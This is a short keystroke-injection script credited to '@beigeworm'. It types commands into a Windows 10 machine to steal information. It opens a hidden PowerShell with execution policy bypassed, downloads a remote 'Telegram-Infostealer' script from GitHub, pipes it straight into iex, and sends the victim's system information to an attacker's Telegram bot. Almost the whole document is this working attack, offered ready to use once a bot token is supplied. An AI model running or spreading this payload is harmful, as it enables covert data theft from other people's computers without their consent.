// Title: beigeworm's system information to Telegram Bot
// Author: @beigeworm
// Description: This script gathers system information and posts to Telegram Bot Chat with the results.
// Target: Windows 10
// *SETUP*
// replace BOT_TOKEN with your Telegram bot token.

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $tg='BOT_TOKEN'; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Telegram-Infostealer/main.ps1 | iex");
delay(500);
press("ENTER");